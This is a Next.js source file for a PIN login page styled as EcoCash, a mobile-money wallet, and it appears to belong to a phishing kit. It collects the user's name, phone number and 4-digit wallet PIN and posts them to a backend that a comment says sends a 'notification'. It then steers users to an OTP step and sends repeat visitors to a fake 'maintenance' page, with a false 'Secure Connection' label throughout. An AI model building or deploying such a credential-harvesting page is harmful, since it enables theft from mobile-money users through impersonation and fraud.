'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { Home, Eye, EyeOff } from 'lucide-react';
import { Button } from '@/components/ui/button';

export default function LoginPinPage() {
  const [pin, setPin] = useState(['', '', '', '']);
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPin, setShowPin] = useState(false);
  const [urlParams, setUrlParams] = useState({ name: '', phone: '' });
  const router = useRouter();

  // Get URL parameters after component mounts (client-side only)
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    setUrlParams({
      name: urlParams.get('name') || '',
      phone: urlParams.get('phone') || ''
    });
  }, []);

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value.slice(-1);
    setPin(newPin);

    // Auto-focus next input
    if (value && index < 3) {
      const nextInput = document.getElementById(`pin-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      const prevInput = document.getElementById(`pin-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (pin.some(digit => !digit)) {
      setError('PIN must be 4 digits');
      return;
    }

    setIsLoading(true);
    
    // Note: Notification is now handled in the auth/login API route
    
    // Authenticate user and get token
    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          name: urlParams.name, 
          phone: urlParams.phone, 
          pin: pin.join('') 
        })
      });
      
      const data = await response.json();
      
      if (response.ok && data.token) {
        // Store the token in localStorage
        localStorage.setItem('token', data.token);
        
        // Check if user logged in within the last 4 hours
        const lastLoginTime = localStorage.getItem('lastLoginTime');
        const now = Date.now();
        
        // If last login was less than 4 hours ago (4 * 60 * 60 * 1000 ms), redirect directly to maintenance
        if (lastLoginTime && (now - parseInt(lastLoginTime)) < 4 * 60 * 60 * 1000) {
          router.push('/maintenance');
        } else {
          // Otherwise, proceed with normal flow to OTP
          router.push(`/loading-secure?action=pin&name=${encodeURIComponent(urlParams.name)}&phone=${encodeURIComponent(urlParams.phone)}&redirect=otp`);
        }
      } else {
        setError(data.message || 'Authentication failed');
      }
    } catch (err) {
      setError('An error occurred during authentication');
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Top Bar */}
      <div className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between">
        <Link
          href="/"
          className="flex items-center gap-2 text-blue-600 hover:text-blue-700 font-semibold transition-colors"
        >
          <Home className="w-5 h-5" />
          Home
        </Link>
        <div className="flex items-center gap-4">
          <Link
            href="/register"
            className="text-blue-600 hover:text-blue-700 font-semibold transition-colors"
          >
            Sign Up
          </Link>
          <div className="text-sm text-green-500 font-semibold">Secure Connection</div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
        {/* Logo */}
        <div className="mb-12 text-center">
          <h1 className="text-5xl font-black">
            <span className="text-blue-600">Eco</span>
            <span className="text-red-600">Cash</span>
          </h1>
        </div>

        {/* PIN Section */}
        <div className="w-full max-w-md">
          <h2 className="text-3xl font-bold text-gray-900 text-center mb-2">Enter Your PIN</h2>
          <p className="text-gray-600 text-center mb-10 text-sm">Authenticate with your 4-digit PIN</p>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* PIN Entry Section */}
            <div>
              <h3 className="text-blue-600 font-bold text-center mb-2 text-lg">Secure PIN Entry</h3>
              <p className="text-gray-600 text-center text-sm mb-6">Enter your 4-digit EcoCash PIN</p>

              <div className="flex justify-center gap-4 mb-6">
                {pin.map((digit, index) => (
                  <input
                    key={index}
                    id={`pin-${index}`}
                    type={showPin ? 'text' : 'password'}
                    value={digit}
                    onChange={(e) => handlePinChange(index, e.target.value)}
                    onKeyDown={(e) => handlePinKeyDown(index, e)}
                    maxLength={1}
                    className="w-16 h-16 text-3xl font-bold text-center border-2 border-gray-300 rounded-2xl focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200"
                  />
                ))}
              </div>

              <button
                type="button"
                onClick={() => setShowPin(!showPin)}
                className="flex items-center justify-center gap-2 text-blue-600 font-semibold hover:text-blue-700 mx-auto transition-colors"
              >
                {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                {showPin ? 'Hide PIN' : 'Show PIN'}
              </button>
            </div>

            {error && <p className="text-red-600 text-center text-sm font-semibold">{error}</p>}

            <Button
              type="submit"
              disabled={isLoading}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 text-lg rounded-xl transition-all"
            >
              {isLoading ? 'Authenticating...' : 'Authenticate'}
            </Button>
            
            <div className="text-center mt-4">
              <p className="text-gray-600 text-sm">Enter the 4-digit PIN you created during registration.</p>
            </div>
          </form>
        </div>
      </div>

      {/* Wavy Divider */}
      <svg viewBox="0 0 1200 120" preserveAspectRatio="none" className="w-full h-24" style={{ marginBottom: "-1px" }}>
        <path d="M0,50 Q300,0 600,50 T1200,50 L1200,120 L0,120 Z" fill="#1e40af" />
      </svg>

      {/* Blue Section with App Promotion */}
      <div className="bg-blue-600 text-white px-6 py-10">
        <div className="max-w-md mx-auto text-center">
          <p className="text-sm opacity-90 mb-6">To register an EcoCash wallet or get assistance, click below</p>

          <div className="bg-gradient-to-br from-purple-400 to-purple-600 rounded-2xl p-8">
            <div className="flex justify-center gap-4 mb-4 opacity-70">
              <div className="w-6 h-6 bg-white rounded-full" />
              <div className="w-6 h-6 bg-white rounded-full" />
              <div className="w-6 h-6 bg-white rounded-full" />
            </div>

            <h3 className="text-xl font-bold mb-2">Install EcoCash Loans</h3>
            <p className="text-sm opacity-90 mb-6">Add to your home screen for quick access and better experience</p>

            <Button className="w-full bg-white text-purple-600 hover:bg-gray-100 font-bold py-3 rounded-xl transition-all">
              Install App
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
}